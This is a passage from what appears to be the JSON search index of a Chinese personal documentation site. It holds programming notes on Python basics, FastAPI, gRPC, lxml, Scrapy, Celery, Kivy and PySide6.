bug：减少约 40％ 的人为（开发者）导致错误。* 智能：极佳的编辑器支持。处处皆可自动补全，减少调试时间。 简单：设计的易于使用和学习，阅读文档的时间更短。 简短：使代码重复最小化。通过不同的参数声明实现丰富功能。bug 更少。 健壮：生产可用级别的代码。还有自动生成的交互式文档。 标准化：基于（并完全兼容）API 的相关开放标准：OpenAPI (以前被称为 Swagger) 和 JSON Schema。 FastAPI 特点 高性能： 基于Starlette和Pydantic，利用异步（asynchronous）编程，提供出色的性能。 自动文档生成： 自动生成交互式API文档，支持Swagger UI和ReDoc，让API的理解和测试更加直观。 类型注解支持： 利用Python的类型提示，提供更严格的输入验证和更好的代码提示。 异步支持： 支持异步请求处理，使得处理IO密集型任务更加高效。 FastAPI 适用场景 构建API后端： 用于构建RESTful API，支持前后端分离的Web应用。 微服务架构： 可以作为微服务的后端框架，支持快速开发和部署。 数据处理API： 适用于处理数据，接收和返回JSON数据。 实时通信： 支持WebSocket，适用于实时通信场景。 为什么选择 FastAPI？ Pythonic： 使用Python的自然语法和类型提示，降低学习曲线。 性能优越： 利用异步编程和底层的Starlette框架，提供卓越的性能。 文档友好： 自动生成交互式文档，减少文档维护的工作量。 生态系统： 基于Python生态系统，可以方便地集成各种库和工具。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-index.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-index.html"},{"title":"Python框架","text":"此节主要是Web框架","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Web-framework-index.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-index.html"},{"title":"Python问题总结","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-index.html","loc":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-index.html"},{"title":"cookbook","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-cookbook-index.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-index.html"},{"title":"Python","text":"python 中 := 的作用 部分语言中 := 是一个赋值语句 python正常来说是没有这种这种语法的 不过有一种特殊情况是用于生成式的赋值操作 [x for x in range(10)] # [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] [y for x in range(10) if (y:=(x*2))] # [2, 4, 6, 8, 10, 12, 14, 16, 18] (暂时只见过这种情况) python的单双引号 基本没有差别，混合使用可以减少转义: >#包含单引号字符串 >my_str = 'I\\'m a student' >my_str = \"I'm a student\" > >#双引号 >my_str = \"Jason said \\\"I like you\\\"\" >my_str = 'Jason said \"I like you\"' 文件读写模式 python 文件处理的打开方式有很多种: os.mknod(\"test.txt\") # 创建空文件 fp = open(\"test.txt\",w) # 直接打开一个文件，如果文件不存在则创建文件 这里主要介绍open 模式, 要了解文件读写模式，需要了解几种模式的区别，以及对应指针 r 读取文件，若文件不存在则会报错 w 写入文件，若文件不存在则会先创建再写入，会覆盖原文件 a 写入文件，若文件不存在则会先创建再写入，但不会覆盖原文件，而是追加在文件末尾 rb,wb,ab 分别于r,w,a类似，但是用于读写二进制文件 r+ 可读、可写，文件不存在也会报错，写操作时会覆盖; 即可以读取文件内容，保存原有内容，追加写内容，写动作则是追加的新内容。其作用和a+基本相同。 w+ 可读，可写，文件不存在先创建，会覆盖; 即w+是打开后，清空原有内容，成为一个新的空文件，对这个空文件具有读写权限。 a+ 可读、可写，文件不存在先创建，不会覆盖，追加在末尾 rb+ 以二进制读写模式打开 (参见 r+ ) wb+ 以二进制读写模式打开 (参见 w+ ) ab+ 以二进制读写模式打开 (参见 a+ ) 参考: https://blog.csdn.net/longshenlmj/article/details/9921665 在linux使用py遇到的一些问题 pkg_resources.DistributionNotFound: pip==0.8.1 具体报错如下: $ sudo pip install gevent-websocket Traceback (most recent call last): File \"/usr/local/bin/pip\", line 5, in <module> from pkg_resources import load_entry_point File \"/usr/lib/python2.7/dist-packages/pkg_resources.py\", line 2675, in <module> parse_requirements(__requires__), Environment() File \"/usr/lib/python2.7/dist-packages/pkg_resources.py\", line 552, in resolve raise DistributionNotFound(req) pkg_resources.DistributionNotFound: pip==0.8.1 可以使用which pip查看一下命令的位置，然后vim查看一下， 会发现文件里是定死了版本号的，想办法改一下 可能是安装了多个pip版本或者pip管理包工具引起的 最终的解决方案: which pip # /usr/local/bin/pip python -m pip install --upgrade --force pip==9 #这里我需要的是9版本的pip cat /usr/local/bin/pip2.7 >/usr/local/bin/pip #这里是which位置 which pip # /usr/bin/local 这里因为我自己设置的原因有一个 ln -s /usr/local/bin/pip2.7 /usr/bin/local ## # 源文件/usr/bin/local和/usr/local/bin/pip都限制死了pip版本，把正确的写进去 ## 关于python的字典 python3.6之前的dict都是无序的 当版本 >= 3.6 时，字典为有序的 py3.6 之前的无序字典: > 是以八行三列的数据结构存储 > > 每一行有三列，每一列占用8byte的内存空间，所以每一行会占用24byte的内存空间 > > 第一列：哈希值对8取余 hash(sKey) > > 第二列：sKey > > 第三列：sValue 当字典的键值对数量超过当前数组长度的2/3时，数组会进行扩容， 8行变成16行，16行变成32行。 长度变了以后，原来的余数位置也会发生变化，此时就需要移动原来位置的数据，导致插入效率变低。 py3.6之后: > 换成了两个一维列表组成 my_dict = {} 此时的内存示意图 （indices 指数 entries 条目）: indices = [None, None, None, None, None, None, None, None] entries = [] 这里先通过对 sKey 取余为 x ，然后 在 entries 插入一个列表 [ \"hash值\", sKey, sValue] 再在 indices 保存插入列表的下标，indices[x] = 下标 Python自带的这个 hash 函数，和我们传统上认为的Hash函数是不一样的。 Python自带的这个 hash 函数计算出来的值，只能保证在每一个运行时的时候不变， 但是当你关闭Python再重新打开，那么它的值就可能会改变， 关于负数取余 带余除法， 对于任意一个整数n ，都可以表示为 n=k*q + r ，其中 0 <= r < q 这里的 r 就是 n 除以 q 的余数，通常记做 n≡r(mod q) 例如-9=(-2)*5+1，则-9除以5的余数为1。 注：java 中 % 优先级高于 - 项目管理工具 才发现python居然没有项目管理工具比如maven 只有个pip /docs/后端/python/包管理器 python的按位与、或 同为 2的n次方 的数 按位或的值等于各个数相加 并且用其中的一个值和最终的数与会得到他本身，反之为0: if __name__ == '__main__': a, b, c = 2, 4, 8 d = a | b | c print(d) print(a & d) print(d & c) print(32 & d) print(32 & c) # 14 # 2 # 8 # 0 # 0 一些斜杠转义 转义字符 , 顾名思义，也就是在我们编码时会使用到的特殊字符: | 转义字符 | 描述 | | ----------------- | ---------- | | \\（处于行尾位置） | 续行符 | | \\\\ | 反斜杠 | | ' | 单引号 | | \\\" | 双引号 | | \\b | 退格 | | \\n | 换行 | | \\v | 纵向制表符 | | \\t | 横向制表符 | | \\r | 回车 | | \\f | 换页 | python执行linux命令 code: import subprocess import os def subprocess_(): \"\"\" subprocess模块执行linux命令 :return: \"\"\" subprocess.call(\"ls\") # 执行ls命令 def system_(): \"\"\" system模块执行linux命令 :return: \"\"\" # 使用system模块执行linux命令时，如果执行的命令没有返回值res的值是256 # 如果执行的命令有返回值且成功执行，返回值是0 res = os.system(\"ls\") def popen_(): \"\"\" popen模块执行linux命令。返回值是类文件对象，获取结果要采用read()或者readlines() :return: \"\"\" val = os.popen('ls').read() # 执行结果包含在val中 def main(): subprocess_() # 方法1 system_() # 方法2 popen_() # 方法3 if __name__ == '__main__': main() 赋值 快速赋值: a=b=c=[] # 因为[]是可变的, a b c 共享内存 设计模式 https://refactoringguru.cn/design-patterns/catalog 关于多线程队列实现 /docs/后端/python/python标准库/threading 队列是基于双向队列 dedque 实现 /docs/后端/python/python标准库/multiprocessing 队列是基于 管道 pipe 实现 有最大限制，win10是1408，linux是6570 关于可重入锁 为什么要有可重入锁？ 当存在继承或者递归调用的时候，可能会出现重复加锁的情况， 如果不能重复加锁，就会自己把自己给锁死 *args, **kwargs 单个 * 表示元组列表 ** 表示转换为字典 这个时候首层的字典的键必须为字符串 python三种基础序列类型 list 可变序列，存放同类项目的集合 tuple 不可变序列，存放固定长度的不同种类的对象集合 range 不可变的数字序列，通常在for循环中循环指定的次数 一些优化建议 创建列表时，建议有初始值就写初始值，不要创建空列表再填充。因为创建空列表一定会扩容 列表的合并，使用 extend或者 += 较好于直接 + pyhton的选项 执行时不生成pyc文件: python -B 获取对象/文件大小 对象 使用 sys.getsizeof() 获取程序中声明的一个整数，存储在变量中的大小 相似场景：文件复制案例中需要获取文件大小，尝试使用 sys.getsizeof()方法 确认：sys.getsizeof()方法用于获取变量中存储数据的大小 详细可参考: /docs/后端/python/python标准库/sys 文件 使用: os.path.getsize(path) 获取指定路径 path 下的文件的大小，以字节为单位 参考: /docs/后端/python/python标准库/os","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-index.html","loc":"/yq-doc-source-docs-rear-end-python-index.html"},{"title":"grpc使用入门","text":"RPC, 远程过程调用服务, 注重传输协议于序列化. 一些认识 /docs/杂乱无章/计算机网络/HTTP认识 gRPC是由Google公司开源的高性能RPC框架。支持多语言、多平台， 其消息协议使用Google自家开源的Protocol Buffers协议机制（proto3） 序列化，传输使用HTTP/2标准，支持双向流和连接多路复用。 安装 安装: pip install grpc grpcio-tools 使用流程(用例说明) 以一个用例说明. 背景: 业务已有一个 Cat 类, 如下 需要与之相关的 rpc 服务来获取其属性 流程: 编写proto文件, 定义数据通信协议 根据编写好的proto协议文件, 生成相应的python文件 编写server服务端 编写client客户端 编写 proto 协议文件 根据需求编写好proto协议文件如下: 其中, 使用message来自定义消息类型, 如定义一个String消息, 只包含一个string类型数据: message StringMessage{ string message = 1; } 技巧 可用 map 定义map类型 可用 repeated 来表示可重复类型, 如: repeated string message = 1; 注意map默认可重复, 不能加 repeated. 私以为, 一般情况下, 对于普通的数据或者约定好的通用接口类型返回, 使用message定义较方便, 但是对于其中的复杂数据类型, 还是使用 bytes 传递二进制数据, 获取后自行处理较方便. 记得大学学java的那段时间, 接口一般都是使用 Result 封装的, 大概如下: class Result(){ int code; string message; Map<T, T> data; } 应该是这样, 具体记不清了, 很久没用了. 如果将这么一个约定好的接口返回写进proto, 那么可以这样: message Result{ int32 code = 1; string message = 2; bytes data = 3; } 这里message定义消息属性的值为 1, 2, 3 , 并非强制这样写, 我看网上大多都是按照123顺序定义值, 多半是跟着官网文档用例来的. 另外本文的协议文件定义了较多数据类型, 正式使用时是不建议的, 最好是只定义一个请求类型, 一个返回类型吧, 此处为用例只是表示可以这么写. 可以看出对于基本的数据类型, 可以很方便定义, 哪怕是复杂一点, 比如有一个 Person 类, 也可以进行多层封装. 但是对于python而言, 尤其是字典类型, 其值的类型大多都不是指定的, 比如本例的 Cat 类获取所有属性(get_all): def all_attr(self): return { 'name': self._name, # 这是 str 'age': self._age, # 这是 int 'love': self._love, # 这是 tuple 'food_once': self._eat_food_once, # 这个则是 Dict[str, float] } 这个时候使用 message 中的普通类型封装就很难, 所以还是决定使用 bytes 直接传递二进制的data数据方便些. RpcCat 是rpc服务, 内定义了将支持哪些调用, 如: rpc get_name (EmptyMessage) returns (StringMessage) {} 表示定义一个rpc调用, 名为 get_name, 请求参数类型为 EmptyMessage, 返回参数类型为 StringMessage (两类型已用message定义). 生成相应的python文件 根据编写好的proto文件生成对应的py文件: mkdir proto python -m grpc_tools.protoc --pyi_out=./proto --python_out=./proto --grpc_python_out=./proto -I. rpc_cat.proto 参数解释: -I PATH , --proto_path= PATH proto文件路径, 包括导入的 --pyi_out= OUT_DIR Generate Python pyi stub. --python_out= OUT_DIR Generate Python source file. --grpc_python_out= OUT_DIR Generate Python source file. 注意这里我放到了 proto 文件夹下, 需要自行处理一下环境导入问题: cd proto echo \"import sys sys.path.append('./proto') \" > __init__.py 注解 protoc: protobuf 编译器(compile), 将 proto 文件编译成不同语言的实现, 这样不同语言中的数据就可以和 protobuf 格式的数据进行交互 protobuf 运行时(runtime): protobuf 运行时所需要的库, 和 protoc 编译生成的代码进行交互 编写server服务端 源码: 注意传参必须使用位置参数: # message=self._cat.love() 的 message不能丢 return rpc_cat_pb2.TupleMessage(message=self._cat.love()) 否则会有报错: TypeError: No positional arguments allowed 编写client客户端 源码: 字典数据直接使用 bytes 定义消息, 使用 json 转换, 较好. 注解 python 可用的 rpc 框架还是比较多的, 比如 grpc, thrift, rryc等 其中 grpc 等拓展性稳定性是最好的 thrift 对 python 的支持不是很好, 但是支持多语言 rryc 基本是服务于纯python, 对只使用 python 的服务较友好 支持的通信方式 一次请求, 一次应答 一次请求, 流式应答 流式请求, 一次应答 流式请求, 流式应答 如要使用流式请求/应答, 参数类型前加 stream 即可. 比如上面的例子, 定义了 流请求, 应答流: rpc get_attr_by_name_with_stream (stream StringMessage) returns (stream StringMessage) {} 对于python代码中的实现, 使用迭代器就好. client端, 请求: @property def _connection(self): if self._stub is None: # with grpc.aio.insecure_channel('localhost:50052') as channel: self._stub = cat_pb2_grpc.RpcCatStub(grpc.aio.insecure_channel('localhost:50052')) return self._stub def get_attr_by_stream(self): def stream_message(): for s in ('name', 'age', 'love'): yield cat_pb2.StringMessage(message=s) response = self._connection.get_attr_by_name_with_stream(stream_message()) return [x for x in response] server端, 应答: def get_attr_by_name_with_stream(self, request_iterator, context): for request in request_iterator: yield rpc_cat_pb2.StringMessage(message=self._cat.get_attr_by_name(request.message))","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-GRPC.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-GRPC.html"},{"title":"lxml","text":"github地址: https://github.com/lxml/lxml 官方主页: <https://lxml.de> 需要先了解 /docs/后端/python/教程/xpath/index 的前置知识 安装: pip install lxml lxml提供了两种解析网页的方式，一种是你解析自己写的离线网页时，另一种 则是解析线上网页。 导入包: from lxml import etree 1.解析离线网页: html=etree.parse('xx.html',etree.HTMLParser()) aa=html.xpath('//*[@id=\"s_xmancard_news\"]/div/div[2]/div/div[1]/h2/a[1]/@href') print(aa) 2.解析在线网页: from lxml import etree import requests rep=requests.get('https://www.baidu.com') html=etree.HTML(rep.text) aa=html.xpath('//*[@id=\"s_xmancard_news\"]/div/div[2]/div/div[1]/h2/a[1]/@href') print(aa)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-LXML.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-LXML.html"},{"title":"Scrapy API参考","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-index.html"},{"title":"命令行工具","text":"参考: https://docs.scrapy.org/en/latest/topics/commands.html 配置文件位置: 优先级最低 系统配置 /etc/scrapy.cfg or c:\\scrapy\\scrapy.cfg 优先级普通 用户配置 ~/.config/scrapy.cfg ($XDG_CONFIG_HOME) and ~/.scrapy.cfg ($HOME) 优先级最高 项目配置 scrapy.cfg 实际生效的配置将会合并上述所有的配置, 支持的环境变量配置: SCRAPY_SETTINGS_MODULE (see Designating the settings) SCRAPY_PROJECT (see Sharing the root directory between projects) SCRAPY_PYTHON_SHELL (see Scrapy shell) 配置共享多个项目 注解 多个项目都需要在当前目录 scrapy.cfg 下定义多个项目(目录)的 scrapy.cfg : [settings] default = myproject1.settings project1 = myproject1.settings project2 = myproject2.settings 默认情况下, scrapy 执行会使用 default , 使用 SCRAPY_PROJECT 环境变量来 切换不同项目: $ scrapy settings --get BOT_NAME Project 1 Bot $ export SCRAPY_PROJECT=project2 $ scrapy settings --get BOT_NAME Project 2 Bot 使用 scrapy 工具 概览: Scrapy X.Y - no active project 语法: scrapy <command> [options] [args] 支持命令(不需要依赖项目): startproject 创建项目 语法: scrapy startproject <project_name> [project_dir] project_dir 项目模块目录名称, 如果不指定, 就跟 myproject 一致 后续的操作都要cd进目录: cd project_dir 其他指令 不依赖项目目录的指令 依赖项目目录的指令(只有在项目目录下才可以正常执行) 自定义项目指令 使用 COMMANDS_MODULE 配置到 scrapy.cfg 实现 COMMANDS_MODULE 配置项 默认值: '' (empty string) Example: COMMANDS_MODULE = \"mybot.commands\" 通过 setup.py 入口注册 注解 也可以通过额外的库注册 比如: from setuptools import setup, find_packages setup( name=\"scrapy-mymodule\", entry_points={ \"scrapy.commands\": [ \"my_command=my_scrapy_module.commands:MyCommand\", ], }, )","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-index.html"},{"title":"选择器","text":"主要是针对 HTML / XML 元素吧 选择器支持, 参考 Selectors 主要提供两种: response.css() response.xpath() 相关类是 /docs/后端/python/python三方库/Scrapy/API/Selector 除了调用response使用, 还可以直接实例使用: >>> from scrapy.selector import Selector >>> body = \"<html><body><span>good</span></body></html>\" >>> Selector(text=body).xpath(\"//span/text()\").get() 'good' 或者自己构造response (HtmlResponse 是 TextResponse 的子类): >>> from scrapy.selector import Selector >>> from scrapy.http import HtmlResponse >>> response = HtmlResponse(url=\"http://example.com\", body=body, encoding=\"utf-8\") >>> Selector(response=response).xpath(\"//span/text()\").get() 'good' Selector会自动解析 xml/html 实时交互解析, 建议使用 scrapy shell <CmdShell> 两种选择器详解(与Scrapy结合使用) 甚至可以将 XPath 与 CSS 结合使用: # 对于 <img src='image4_thumb.jpg' alt='image4'/> response.css(\"img\").xpath(\"@src\")","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Selector-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Selector-index.html"},{"title":"Scrapy","text":"Python爬虫库 官网: https://scrapy.org 文档: https://docs.scrapy.org/en/latest/ Scrapy 是用 Python 实现的一个为了爬取网站数据、提取结构性数据而编写的应用框架。 Scrapy 常应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。 通常我们可以很简单的通过 Scrapy 框架实现一个爬虫，抓取指定网站的内容或图片。 安装: pip install Scrapy 注解 建议安装在虚拟环境以避免冲突 相关库 /docs/后端/python/python三方库/lxml : 高效的 xml 和 html 解析器 parsel: 基于 lxml 编写的一个 HTML/XML 数据提取库 w3lib: 处理 URL 和网页编码的多用途助手 twisted: 异步网络框架 /docs/后端/python/python三方库/cryptography : 处理各种网络级安全需求 pyOpenSSL: 处理各种网络级安全需求 注解 这些库可能依赖非Py库 相关工具","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-index.html"},{"title":"celery","text":"安装: pip install celery[librabbitmq,redis,auth,msgpack] 详细见: /docs/后端/python/python三方库/celery_more/option_install 简介 分布式任务队列 一个简单、灵活、可靠的分布式系统，可用于处理大量消息的消息队列, 可用于处理实时数据以及任务调度 任务队列: 一般用于线程或计算机之间分配工作的一种机制 Celery 通过消息机制进行通信: Broker 中间人 Worker 职程 客户端向消息队列发送消息, 实际就是给到了 Broker, 然后 Broker 将消息发给 Worker, 由 Worker 执行. Celery 可以在一台机器上运行，也可以在多台机器上运行，甚至可以跨数据中心运行。 优点: 分布式, 可多机运行 跨语言(协议) 自定义消息队列(Broker), 如: rabbitmq, redis 高可用, 如果出现丢失连接或连接失败，职程（Worker）和客户端会自动重试，并且中间人通过 主/主 主/从 的方式来进行提高可用性。 快速, 单个 Celery 进行每分钟可以处理数以百万的任务，而且延迟仅为亚毫秒（使用 RabbitMQ、 librabbitmq 在优化过后）。 灵活, Celery 的每个部分几乎都可以自定义扩展和单独使用. 例如自定义连接池、序列化方式、压缩方式、日志记录方式、任务调度、生产者、消费者、中间人（Broker）等。 支持 Crontab 定时任务 内存保护, --max-tasks-per-child 参数适用于可能会出现资源泄漏（例如：内存泄漏）的任务 时间和速率的限制, 可以控制每秒/分钟/小时执行任务的次数，或者任务执行的最长时间，也将这些设置为默认值，针对特定的任务或程序进行定制化配置 相关说明: Celery Beat: 任务调度器，Beat 进程会读取配置文件的内容，周期性的将配置中到期需要执行的任务发送给任务队列 Celery Worker: 执行任务的消费者，通常会在多台服务器运行多个消费者来提高运行效率 Broker: 消息代理，也是任务队列本身（通常是消息队列或者数据库），通常称为消息中间件， 接收任务生产者发送过来的任务消息，存进队列再按序分发给任务消费方 Producer: 任务生产者，调用 Celery API 的函数或者装饰器而产生任务并交给任务队列处理的都是任务生产者 中间件配置 Celery 需要消息中间件来进行发送和接收消息。 RabbitMQ 和 Redis 中间人的功能比较齐全，但也支持其它的实验性的解决方案，其中包括 SQLite 进行本地开发。 应用设计(编码) task.py: from celery import Celery app = Celery('tasks', broker='amqp://guest@localhost//') @app.task def add(x, y): return x + y 第一个参数为当前模块的名称，只有在 __main__ 模块中定义任务时才会生产名称。 第二个参数为中间人（Broker）的链接 URL。 app的传递 即 Celery 实例 的共享, 一般不建议使用全局的 app 变量, 而是以参数传递的形式替代: class Scheduler(object): def __init__(self, app): self.app = app 在celery内部实现中，使用 celery.app_or_default() 函数使得模块级别的 API 也能正常使用: from celery.app import app_or_default class Scheduler(object): def __init__(self, app=None): self.app = app_or_default(app) 在开发环境中，可以通过设置 CELERY_TRACE_APP 环境变量在应用实例链被打破时抛出一个异常: $ CELERY_TRACE_APP=1 celery worker -l info 中文翻译文档称其为 打破链式操作：Breaking the chain 不是怎么理解是何含义 启动Worker 启动/运行 Celery 职程（Worker）服务 命令行启动 code: celery -A tasks worker --loglevel=info # celery -A src.time_schedule --workdir ./ worker -l info -E 注解 可以查看帮助信息: celery --help 直接在 python 中启动 调试时使用比较方便, 或者是一些需要在代码内部启动时 启动一个职程（Worker）:: from celery import Celery app = Celery() @app.task def add(x, y): return x + y if __name__ == '__main__': app.worker_main() 手动调用任务 命令行 使用命令行的方式, 详情可参考 /docs/后端/python/python三方库/celery_more/命令行工具 例:: celery -A src.time_schedule call -a '[2, 2]' src.time_schedule.pre_tasks.add 7506ef60-5621-460a-8219-7a97f6e96f4e 代码使用方式 调用我们创建的实例任务，可以通过 delay() 进行调用。 delay() 是 apply_async() 的快捷方法，可以更好的控制任务的执行（详情：调用任务：Calling Tasks）: >>> from tasks import add >>> add.delay(4, 4) 该任务已经有职程（Worker）开始处理，可以通过控制台输出的日志进行查看执行情况。 调用任务会返回一个 AsyncResult 的实例，用于检测任务的状态，等待任务完成获取返回值（如果任务执行失败，会抛出异常）。 默认这个功能是不开启的，如果开启则需要配置 Celery 的结果后端，见 保存任务结果 。 详细说明 使用 delay() 方法进行调用: >>> add.delay(2, 2) delay() 实际上为 apply_async() 的快捷使用: >>> add.apply_async((2, 2)) apply_async() 可以指定调用时执行的参数，例如运行的时间，使用的任务队列等: >>> add.apply_async((2, 2), queue='lopri', countdown=10) 上面的实例中，任务被下发到 lopri 队列中，任务下发之后会在最早10秒内执行。 直接调用任务函数进行执行任务，不会发送任何任务消息: >>> add(2, 2) 4 每一个任务被调用时会赋值一个的任务ID（UUIID）: res = add.delay(2, 2) res.id 如果任务执行引发异常，可以进行检查异常以及溯源，默认情况下 result.get() 会抛出异常: >>> res = add.delay(2) >>> res.get(timeout=1) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> File \"/opt/devel/celery/celery/result.py\", line 113, in get interval=interval) File \"/opt/devel/celery/celery/backends/rpc.py\", line 138, in wait_for raise meta['result'] TypeError: add() takes exactly 2 arguments (1 given) 如果不希望 Celery 抛出异常，可以通过设置 propagate 来进行禁用: >>> res.get(propagate=False) TypeError('add() takes exactly 2 arguments (1 given)',) 在这种情况下，他可以返回引发错误的实例，需要检查任务是否执行成功还是失败，可以通过在结果实例中使用对应的方法: >>> res.failed() True >>> res.successful() False 如何知道任务是否执行失败？可以通过查看任务的 state 进行查看: >>> res.state 'FAILURE' 一个任务只能有当前只能有一个状态，但他的执行过程可以为多个状态，一个典型的阶段是: PENDING -> STARTED -> SUCCESS 启动状态是一种比较特殊的状态，仅在 task_track_started 启用设置或 @task(track_started=True)的情况下才会进行记录。 挂起状态实际上不是记录状态，而是未知任务ID的默认状态，可以从此实例中看到: >>> from proj.celery import app >>> res = app.AsyncResult('this-id-does-not-exist') >>> res.state 'PENDING' 重试任务比较复杂，为了证明，一个任务会重试两次，任务的阶段为: PENDING -> STARTED -> RETRY -> STARTED -> RETRY -> STARTED -> SUCCESS 保存任务结果 如使用Redis作为Celery结果后端和中间人, app = Celery('tasks', backend='redis://localhost', broker='redis://localhost') 已经配置结果后端，重新调用执行任务。会得到调用任务后返回的一个 AsyncResult 实例: >>> result = add.delay(4, 4) ready() 可以检测是否已经处理完毕: >>> result.ready() False 整个任务执行过程为异步的，如果一直等待任务完成，会将异步调用转换为同步调用: >>> result.get(timeout=1) 8 如果任务出现异常，get() 会再次引发异常，可以通过 propagate 参数进行覆盖: >>> result.get(propagate=False) 如果任务出现异常，可以通过以下命令进行回溯: >>> result.traceback 注解 也可以使用配置文件进行配置, 见 /docs/后端/python/python三方库/celery_more/conf_celery 如果后端使用资源进行存储结果，必须要针对调用任务后返回每一个 AsyncResult 实例调用 get() 或 forget() ，进行资源释放。 远程控制 使用 RabbitMQ（AMQP）、Redis 或 Qpid 作为中间人（Broker），可以在运行时控制和检查职程（Worker）。 例如，当前职程（Worker）正在处理的任务: $ celery -A proj inspect active 这是通过广播消息实现的，集群中所有职程（Worker）都会所有收到远程控制发出的指令。 也可以通过 --destination 选项指定一个或多个职程（Worker）进行操作，使用\",\"进行分割职程（Worker）主机列表: $ celery -A proj inspect active --destination=celery@example.com 如果没有提供目的地，那么每个工作人员都将采取行动并回复请求。 celery inspect 命令不能修改程序，只能进行查看职程（Worker）概况以及统计信息，可以通过 help 进行查看: $ celery -A proj inspect --help celery control 命令可以查看实际上改变了工作在运行时的状况: $ celery -A proj control --help 例如，可以强制职程（Worker）启用事件消息（用于监控任务以及职程（Worker））: $ celery -A proj control enable_events 启动事件后，可以启动事件转储程序，进行查看职程（Worker）目前执行的状况: $ celery -A proj events --dump 或者可以启动 curses 接口: $ celery -A proj events 当监控完毕之后，可以禁用事件: $ celery -A proj control disable_events celery status 命令可以远程控制并且显示集群中职程（Worker）的列表: $ celery -A proj status 查看所有任务 调用 Celery 实例的 tasks app = Celery() app.tasks 仅当导入定义的模块时任务才会被注册。 默认加载程序导入配置 imports 列出的所有模块。 app.task() 装饰器负责在应用任务注册表中注册你的任务。 详细说明","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-celry.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-celry.html"},{"title":"kivy","text":"一个开源的GUI库, 相对PyQT, tkinter这种GUI框架而言, 增加了对移动平台如安卓, IOS的支持. (虽然Qt貌似也支持编写安卓应用, 不过使用好麻烦) 官网文档: https://kivy.org/doc/stable/gettingstarted/intro.html 详见:","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy.html"},{"title":"Kivy","text":"注解 看着看着, 发现如果要调用安卓的API(与安卓交互), 实际还是需要与Java交互, 调用Java类. 这样还不如直接去搞Java, 反正以前大学主攻就是Java, 虽然是Web方向, Kivy, 弃之...","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-index.html"},{"title":"Python Qt官方框架 pyside6","text":"官网文档:: Qt for Python 相关资源官网下载地址: https://download.qt.io/snapshots/ 安装: pip install pyside6 主要组件: PySide6: 使用QT6的API ShiBoken6: 提供了些与 C++ 交互的方式 (把C++项目拓展到python), 及一些工具方法(工具模块) 其实安装的还有额外的包: (dev_venv) yanque@mbp14 project % pip list | grep -iE 'pyside|shi' PySide6 6.4.1 PySide6-Addons 6.4.1 PySide6-Essentials 6.4.1 shiboken6 6.4.1 PySide6-Essentials, 是必要包 PySide6-Addons, 附加(additional)包 PySide6.QtWidgets下常用控件 布局相关 QHBoxLayout, 水平布局(从左到右) QVBoxLayout, 垂直布局(从上到下) QGridLayout, 格子布局 QFormLayout, 只有两列的格子布局 控件 QPushButton, 点击按钮 QLineEdit, 单行文本框 QPlainTextEdit, 多行纯文本框 QTextBrowser, 文本浏览器(只读) QLabel, 普通标签 详情","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6.html"},{"title":"Qt支持的模块","text":"官网地址:: modules 一些附加说明: 其实主要是 pyside6 下面的一些模块: QtBluetooth, 提供与设备蓝牙接口的访问 QtCharts, 提供一系列便捷使用的图表组件 QtConcurrent, 提供多线程编程的高级接口, 不需要关心如何维护底层的锁等. 🪐 QtCore, 核心非 GUI 方法 🪐 QtGui, 核心 GUI 方法 QtDataVisualization, 3维可视化数据展示(条形图, 散点图, 表层图) QtDBus, 统一的, 基于linux的 IPC, RPC 协议 QtDesigner, 继承 Qt Designer 的类 QtHelp, 内置帮助文档(与在线文档内容一致) Qt Multimedia, 多媒体使用相关 API Qt Multimedia Widgets, 多媒体使用相关基础控件 API QtNetwork, 编码 TCP/IP 客户端/服务端相关 Qt Network Authorization, 暴露用户密码, 提供 Qt 应用对 在线应用(如HTTP服务)的限制性访问 QtNfc, 访问设备NFC接口 QtOpenGL, 易于使用 OpenGL (GPU相关的GUI接口, 一系列操作图形/图片的函数API) QtOpenGL Widgets, OpenGL 相关的控件. Qt Positioning, 位置访问. 卫星信息和区域监测 Qt PDF, 展示PDF文档相关 Qt PDF Widgets, 支持的PDF视图控件 QtPrintSupport, 跨平台打印支持 QtQml, QML [1] API (引入类似Web XML技术). QtQuick, Qt 应用中嵌入 Qt Quick (引入类似Web XML技术), 其实就是嵌入 js 形式编码的东西 QtQuickControls2, 从 C++ 设置控件 QtQuickWidgets, QtQuick 相关控件的嵌入 QtRemoteObjects, 基于Qt的 IPC 模块, 易于与计算机进程通信 Qt Scxml, 从 SCXML 文件创建和使用状态机 Qt Sensors, 